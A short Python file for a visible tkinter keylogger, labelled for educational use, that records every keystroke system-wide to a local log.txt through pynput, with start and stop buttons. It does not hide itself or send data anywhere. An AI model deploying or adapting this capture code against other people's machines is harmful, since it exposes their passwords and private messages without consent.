import tkinter as tk
from pynput import keyboard
import threading

class KeyLoggerGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Keyboard Logger (Educational Use Only)")
        self.master.geometry("400x200")

        self.logging = False
        self.listener = None

        self.label = tk.Label(master, text="Status: Not Logging", fg="red", font=("Arial", 14))
        self.label.pack(pady=20)

        self.start_button = tk.Button(master, text="Start Logging", command=self.start_logging, width=20, bg="green", fg="white")
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(master, text="Stop Logging", command=self.stop_logging, width=20, bg="red", fg="white")
        self.stop_button.pack(pady=5)

        # Clear log file at the start
        with open("log.txt", "w") as log:
            log.write("")

    def start_logging(self):
        if not self.logging:
            self.logging = True
            self.label.config(text="Status: Logging...", fg="green")
            self.listener_thread = threading.Thread(target=self.listen_keys)
            self.listener_thread.daemon = True
            self.listener_thread.start()

    def stop_logging(self):
        if self.logging and self.listener:
            self.listener.stop()
            self.listener = None
            self.logging = False
            self.label.config(text="Status: Not Logging", fg="red")

    def on_press(self, key):
        with open("log.txt", "a") as log:
            log.write(f"{key}\n")

    def listen_keys(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.listener.join()

# Run the app
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyLoggerGUI(root)
    root.mainloop()
